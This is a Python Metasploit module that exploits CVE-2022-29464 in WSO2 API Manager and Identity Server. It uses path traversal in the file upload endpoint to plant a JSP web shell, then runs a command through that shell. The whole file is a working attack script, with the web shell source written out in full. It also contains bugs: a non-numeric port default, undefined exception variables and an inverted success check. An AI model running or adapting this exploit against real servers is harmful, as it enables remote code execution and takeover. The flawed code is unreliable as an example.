#!/usr/bin/env python3

# standard modules
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests
    import urllib3
    import sys
    import time
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'WSO2 Arbitrary File Upload to RCE',
    'description': '''
        This module abuses a vulnerability in certain WSO2 products that allow unrestricted file
          upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and
          above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server
          Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above
          through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.
    ''',
    'authors': [
        'yuting',
    ],
    'date': '2022-05-23',
    'license': 'MSF_LICENSE',
    'references': [
                                {'type': 'url', 'ref': 'https://github.com/hakivvi/CVE-2022-29464'},
        {'type': 'cve', 'ref': '2022-29464'}
    ],
    'type': 'single_scanner',
    'options': {
        'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': '/'},
        'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        'METHOD': {'type': 'string', 'description': 'Vulunarable HTTP method', 'required': True, 'default': 'POST'}
    }
}


def find_base_url(args):
    base_url = 'http://{}:{}'.format(args['rhost'], args['RPORT'])
    return base_url

def make_shell():
    shell = """<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
        <pre><%=output %></pre>"""
    
    return shell

def exploit(url,files):
    try:
        response = requests.post(url + f'/fileupload/toolsAny', files=files, verify=False)
    except:
        module.log(str(e), level='error')
        return False
    
    payload = {'cmd': 'ls'}
    url = url + "//authenticationendpoint/abc.jsp"

    try:
        r = requests.get(url,params = payload)
        module.log('success upload abc.jsp',level='good')
        if not r and r.status_code == 200:
            return False
        if(r.text == ""):
            return False
        else:
            module.log('successfully execute cmd',level='good')
    except:
        module.log(str(e), level='error')
        return False

    return True


def run(args):
    try:
        # dependency check
        if dependencies_missing:
            module.log('Module dependency (requests) is missing, cannot continue', level='error')
            return

        base_url = find_base_url(args)
        shell = make_shell()
        files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/abc.jsp": shell}
        url = base_url
        
        module.log('File: abc.jsp', level='good')
        
        if exploit(url,files) :
            module.log('Exploit completed', level='good')    
        else:
            module.log('Exploit failed',level='error')
        
    except Exception as e:
        module.log(str(e), level='error')


if __name__ == '__main__':
    module.run(metadata, run)
